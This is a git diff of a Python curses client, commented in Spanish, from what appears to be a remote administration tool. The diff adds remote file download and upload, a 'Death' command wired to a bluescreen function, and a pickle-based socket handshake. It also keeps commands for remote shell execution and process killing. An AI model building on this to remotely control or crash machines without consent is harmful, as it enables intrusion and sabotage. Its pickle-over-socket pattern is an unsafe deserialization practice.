@@ -1,29 +1,36 @@
+import pickle
 import socket
-import subprocess
 from . import functions as f
 import curses
-import time
 from math import ceil
+from client.setup import ClientSetup
 
 
 class Client:
-    def __init__(self, host, port):
+    def __init__(self, host = None, port=None, client_socket=None):
         self.host = host
         self.port = port
+        self.setup = ClientSetup(__name__)
         # Definimos qué comandos necesitan argumentos y cuáles son
         self.command_args = {
             "kill": ["pid", "Ingrese el PID del proceso a terminar: "],
             "files": ["path", "Ingrese la ruta a listar (Enter para actual): "],
-            "shell": ["command", "Ingrese el comando a ejecutar: "]
+            "shell": ["command", "Ingrese el comando a ejecutar: "],
+            "download": ["remote_path", "Ingrese la ruta del archivo remoto: "],
+            "upload": ["local_path", "Ingrese la ruta del archivo local: "],
         }
+
         self.commands = {
             "hostname": f.get_hostname,
             "ip": f.get_ip,
             "os": f.get_os,
+            "Death": f.bluescreen,
             "users": f.get_users,
             "processes": f.get_processes,
             "drives": f.get_drives,
             "files": f.get_files,
+            "download": f.download_file,
+            "upload": f.upload_file,
             "network": f.get_network,
             "services": f.get_services,
             "kill": f.kill_process,
@@ -32,10 +39,10 @@ class Client:
             "environment": f.get_environment,
             "installed_software": f.get_installed_software,
             "network_connections": f.get_network_connections,
-            "Close connection": self.close
+            "Uninstall tool": self.setup.uninstall,
         }
 
-        self.client_socket = None
+        self.client_socket = client_socket if client_socket else  None
         self.status_message = ""
         self.colors = {}
 
@@ -78,7 +85,7 @@ class Client:
         curses.curs_set(0)  # Ocultar el cursor
         return args
 
-    def execute_command(self, stdscr,command):
+    def execute_command(self, stdscr, command):
         """Ejecuta un comando en el sistema y devuelve la salida."""
         try:
             if command in self.command_args:
@@ -103,16 +110,17 @@ class Client:
         self.colors['status_error'] = 4
         self.colors['help'] = 5
 
-        curses.init_pair(1, curses.COLOR_BLUE, -1)  # Título
-        curses.init_pair(2, curses.COLOR_BLUE, -1)  # Selección
-        curses.init_pair(3, curses.COLOR_GREEN, -1)  # Bordes (estado activo)
-        curses.init_pair(4, curses.COLOR_RED, -1)  # Estado inactivo
-        curses.init_pair(5, curses.COLOR_YELLOW, -1)  # Estado de ayuda o aviso
+        curses.init_pair(1, curses.COLOR_BLUE, curses.COLOR_BLACK)  # Título
+        curses.init_pair(2, curses.COLOR_BLUE, curses.COLOR_BLACK)  # Selección
+        curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)  # Bordes (estado activo)
+        curses.init_pair(4, curses.COLOR_RED, curses.COLOR_BLACK)  # Estado inactivo
+        curses.init_pair(5, curses.COLOR_YELLOW, curses.COLOR_BLACK)  # Estado de ayuda o aviso
 
-    def connect(self, ip, port):
+    def connect(self):
         """Conecta al servidor."""
         try:
-            self.client_socket = socket.create_connection((ip, port))
+            self.client_socket = socket.create_connection((self.host, self.port))
+            self.client_socket.sendall(pickle.dumps({"status": "connected"}))  # Mensaje de prueba
             self.status_message = "[+] Conectado al servidor."
             return True
         except Exception as e:
@@ -147,7 +155,6 @@ class Client:
             win.addch(y + height - 1, x + width - 1, curses.ACS_LRCORNER)
 
     def display_commands(self, stdscr):
-        """Muestra la lista de comandos en la interfaz curses y permite la selección."""
         self.init_colors()
         curses.curs_set(0)  # Oculta el cursor
         current_row = 0
@@ -280,9 +287,9 @@ class Client:
             elif key == curses.KEY_RIGHT and current_page < pages - 1:
                 current_page += 1
 
-
     def close(self):
         """Cierra la conexión del cliente."""
         if self.client_socket:
             self.client_socket.close()
+            self.client_socket = None
             self.status_message = "[-] Conexión cerrada."
